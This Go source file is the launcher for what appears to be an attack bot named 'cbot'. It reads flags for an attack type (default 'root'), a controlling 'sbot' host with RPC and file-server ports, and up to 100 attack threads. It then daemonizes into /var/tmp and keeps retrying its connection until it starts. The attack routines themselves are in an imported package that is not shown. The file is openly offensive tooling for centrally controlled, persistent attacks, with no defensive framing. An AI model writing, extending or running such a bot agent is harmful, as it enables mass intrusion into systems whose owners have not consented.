package main

import (
	"flag"
	"fmt"
	"github.com/cbot/node"
	"github.com/sevlyar/go-daemon"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

var (
	pnodeId = flag.String("pnode", "", "set parent nodeId")
	attackType = flag.String("attackType","root","set the cbot attacked type")
	sbotHost = flag.String("rhost", "127.0.0.1", "set sbot host")
	sbotRpcPort = flag.Int("rport", 3333, "set sbot rpc port")
	sbotFileServerPort = flag.Int("fport", 6666, "set sbot file server port")
	maxThreads = flag.Int("threads", 100, "set max threads that attack")
	scapacity = flag.Int("scap", 100, "set source queue capacity")
	acapacity = flag.Int("acap", 10, "set attack queue capacity")
	taskId = flag.String("taskId", "", "set the task id")
)

func main() {

	flag.Parse()

	cntxt := &daemon.Context{
		PidFileName: fmt.Sprintf("/var/tmp/cbot_%d.pid",time.Now().UnixNano()),
		PidFilePerm: 0644,
		LogFileName: fmt.Sprintf("/var/tmp/cbot_%d.log",time.Now().UnixNano()),
		LogFilePerm: 0640,
		WorkDir:     "/var/tmp",
		Umask:       027,
		Args:        os.Args,
	}

	d, err := cntxt.Reborn()
	if err != nil {
		log.Fatal("Unable to run: ", err)
	}

	if d != nil {
		return
	}

	defer cntxt.Release()

	log.Println("- - - - - - - - - - - - - - -")
	log.Println("daemon started")

	startCbot()

}


func startCbot(){


	cfg := &node.Config{
		TaskId:                *taskId,
		PNodeId:               *pnodeId,
		AttackType: 		   *attackType,
		SbotHost:              *sbotHost,
		SbotRPCPort:           *sbotRpcPort,
		SbotFileServerPort:    *sbotFileServerPort,
		MaxThreads:            *maxThreads,
		SourceCapacity:        *scapacity,
		AttackProcessCapacity: *acapacity,
	}

	node := node.NewNode(cfg)

	for {

		if err := node.Start(); err != nil {

			log.Printf("Start node failed:%v", err)
			time.Sleep(2 * time.Minute)
			continue
		} else {

			//start ok
			break
		}
	}

	log.Printf("Start cbot ok!")

	waitExit()
}

func waitExit() {

	sigs := make(chan os.Signal, 1)

	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	<-sigs
}
